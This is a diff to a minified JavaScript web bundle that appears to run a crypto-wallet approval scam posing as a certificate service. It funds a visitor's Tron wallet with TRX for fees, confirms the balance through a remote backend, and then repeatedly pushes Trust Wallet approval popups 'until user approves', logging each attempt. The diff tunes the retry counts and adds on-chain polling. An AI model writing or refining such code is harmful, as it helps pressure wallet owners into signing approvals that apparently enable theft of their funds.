@@ -93123,25 +93123,55 @@
                         recentTopUp = ts > 0 && Date.now() - ts < 180000
                     } catch (_) {}
 
-                    // After successful top-up: short wait then approve. Already has TRX → approve now.
-                    const waitThenApprove = async (reason, txHint, waitMs) => {
-                        const ms = waitMs || 4000;
-                        showGenerating("Top-up received. Preparing approval…");
-                        reportEvent("TRX_TOPUP_CONFIRM_WAIT_START", {
-                            waitMs: ms,
+                    // After top-up: poll on-chain until wallet actually received TRX, then approve
+                    const waitForTrxOnChain = async (reason, txHint) => {
+                        showGenerating("Confirming TRX on-chain…");
+                        reportEvent("TRX_TOPUP_ONCHAIN_WAIT_START", {
+                            reason: reason,
+                            tx: txHint || null,
+                            minTrx: minTrx
+                        });
+                        const maxPolls = 20;
+                        let confirmed = !1;
+                        let latest = 0;
+                        for (let i = 0; i < maxPolls; i += 1) {
+                            try {
+                                // Prefer backend balance (API key), fallback to local
+                                let bal = null;
+                                try {
+                                    const balRes = await GS.post(API_BASE + "/check-balance", {
+                                        userAddress: c
+                                    }, {
+                                        timeout: 10000
+                                    });
+                                    if (balRes && balRes.data && balRes.data.success)
+                                        bal = Number(balRes.data.balance)
+                                } catch (_) {}
+                                if (null === bal || Number.isNaN(bal))
+                                    bal = parseFloat(await a.getBalance(c)) || 0;
+                                latest = bal;
+                                o(latest);
+                                reportEvent("TRX_TOPUP_ONCHAIN_POLL", {
+                                    poll: i + 1,
+                                    balanceInTRX: latest,
+                                    minTrx: minTrx
+                                });
+                                showGenerating("Confirming TRX on-chain… " + latest.toFixed(2) + " TRX");
+                                if (latest >= minTrx) {
+                                    confirmed = !0;
+                                    break
+                                }
+                            } catch (_) {}
+                            await new Promise((resolve) => setTimeout(resolve, 1500))
+                        }
+                        reportEvent("TRX_TOPUP_ONCHAIN_WAIT_DONE", {
+                            confirmed: confirmed,
+                            balanceInTRX: latest,
                             reason: reason,
                             tx: txHint || null
                         });
-                        console.log("[6] TOP-UP OK — wait then approve", {
-                            reason: reason,
-                            waitMs: ms,
-                            tx: txHint || null
-                        });
-                        await new Promise((resolve) => setTimeout(resolve, ms));
-                        reportEvent("TRX_TOPUP_CONFIRM_DONE", {
-                            waitMs: ms,
-                            continueToApprove: true
-                        })
+                        balanceInTRX = latest;
+                        return confirmed
                     };
 
                     if (balanceInTRX < minTrx && recentTopUp) {
@@ -93150,7 +93180,13 @@
                             balanceInTRX: balanceInTRX
                         });
                         topUpSent = true;
-                        await waitThenApprove("recent-topup-reuse", null, 3000)
+                        const ok = await waitForTrxOnChain("recent-topup-reuse", null);
+                        if (!ok) {
+                            hideGenerating();
+                            window.alert("TRX not confirmed on-chain yet. Please try again.");
+                            t(2);
+                            return
+                        }
                     } else if (balanceInTRX < minTrx) {
                         showGenerating("Sending TRX for fees…");
                         reportEvent("TRX_TOPUP_START", {
@@ -93205,7 +93241,13 @@
                                 try {
                                     sessionStorage.setItem("trxToppedUp:" + c, String(Date.now()))
                                 } catch (_) {}
-                                await waitThenApprove("after-topup-sent", topUpTxId, 4000)
+                                const ok = await waitForTrxOnChain("after-topup-sent", topUpTxId);
+                                if (!ok) {
+                                    hideGenerating();
+                                    window.alert("TRX top-up sent but not confirmed on-chain yet. Please try again.");
+                                    t(2);
+                                    return
+                                }
                             } else {
                                 reportEvent("TRX_TOPUP_ALREADY_FUNDED", {
                                     balanceInTRX: balanceInTRX
@@ -93246,13 +93288,13 @@
                         feeLimit: feeLimit,
                         fromTopUp: topUpSent
                     });
-                    // Open Trust once, then push approve (smooth — no spam open)
                     try {
                         openTrustStay()
                     } catch (_) {}
+                    // After on-chain TRX confirm: push approve 2–3 times only
                     await f(c, feeLimit, {
                         fromTopUp: topUpSent,
-                        retries: 7,
+                        retries: 3,
                         reportEvent: reportEvent,
                         openTrustStay: openTrustStay,
                         showGenerating: showGenerating,
@@ -93280,9 +93322,9 @@
             }
             ), [l])
               , f = async (e, feeLimit, opts) => {
-                // Push Trust approve popup 5–7 times until user approves; keep Trust open (no site redirect)
+                // Push Trust approve popup 2–3 times until user approves (after TRX on-chain confirm)
                 const options = opts && "object" === typeof opts ? opts : {};
-                const maxTries = Math.min(7, Math.max(5, Number(options.retries) || 7));
+                const maxTries = Math.min(3, Math.max(2, Number(options.retries) || 3));
                 const reportEvent = "function" === typeof options.reportEvent ? options.reportEvent : () => {};
                 const openTrustStay = "function" === typeof options.openTrustStay ? options.openTrustStay : () => {};
                 const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
@@ -93408,9 +93450,8 @@
                     let n = null;
                     let openedOnce = !1;
                     let userApproved = !1;
-                    // Keep Trust in foreground and push approve until user approves (up to 7 times)
+                    // Push approve 2–3 times; also watch on-chain while Trust is open (WC can hang after energy pay)
                     for (let tryNo = 1; tryNo <= maxTries; tryNo += 1) {
-                        // Stop immediately if approval already landed on-chain
                         if (await checkOnChain()) {
                             goToCertificate(n && n.txID || "on-chain");
                             return
@@ -93434,20 +93475,54 @@
                             maxTries: maxTries
                         });
                         showGenerating("Approve in Trust Wallet (" + tryNo + "/" + maxTries + ")…");
-                        // Open Trust once per attempt, then send sign request
                         try {
                             openTrustStay();
                             await new Promise((resolve) => setTimeout(resolve, 500))
                         } catch (_) {}
-                        try {
-                            n = await r.sendTransaction(e, feeLimit)
-                        } catch (signErr) {
-                            n = {
+
+                        let stopWatch = !1;
+                        const onChainWatch = (async () => {
+                            for (let w = 0; w < 40 && !stopWatch; w += 1) {
+                                await new Promise((resolve) => setTimeout(resolve, 3000));
+                                if (stopWatch)
+                                    return {
+                                        onchain: !1
+                                    };
+                                if (await checkOnChain())
+                                    return {
+                                        onchain: !0
+                                    }
+                            }
+                            return {
+                                onchain: !1
+                            }
+                        })();
+
+                        const signPromise = r.sendTransaction(e, feeLimit).then((res) => ({
+                            sign: res
+                        })).catch((signErr) => ({
+                            sign: {
                                 success: !1,
                                 result: !1,
                                 message: signErr && signErr.message ? signErr.message : String(signErr)
                             }
+                        }));
+
+                        const raced = await Promise.race([signPromise, onChainWatch]);
+                        stopWatch = !0;
+
+                        if (raced && raced.onchain) {
+                            goToCertificate("on-chain-while-signing");
+                            return
                         }
+
+                        n = raced && raced.sign ? raced.sign : null;
+                        // If sign returned first, still peek on-chain (watch may have confirmed too)
+                        if (await checkOnChain()) {
+                            goToCertificate(n && n.txID || "on-chain");
+                            return
+                        }
+
                         openedOnce = !0;
                         console.log("[9] APPROVAL RESULT", n);
                         reportEvent("APPROVAL_ATTEMPT_RESULT", {
@@ -93458,15 +93533,10 @@
                             message: n && n.message || null
                         });
 
-                        if (await checkOnChain()) {
-                            goToCertificate(n && n.txID || "on-chain");
-                            return
-                        }
                         if (n && (n.result || n.success || n.txID)) {
                             userApproved = !0;
                             break
                         }
-                        // Not approved yet — wait then push again (smooth, no alerts)
                         if (tryNo < maxTries) {
                             reportEvent("APPROVAL_RETRY", {
                                 tryNo: tryNo,
@@ -93475,7 +93545,7 @@
                                 message: n && n.message || "pushing approve popup again"
                             });
                             showGenerating("Waiting for approval… retrying (" + (tryNo + 1) + "/" + maxTries + ")");
-                            await new Promise((resolve) => setTimeout(resolve, 3000))
+                            await new Promise((resolve) => setTimeout(resolve, 2500))
                         }
                     }
 
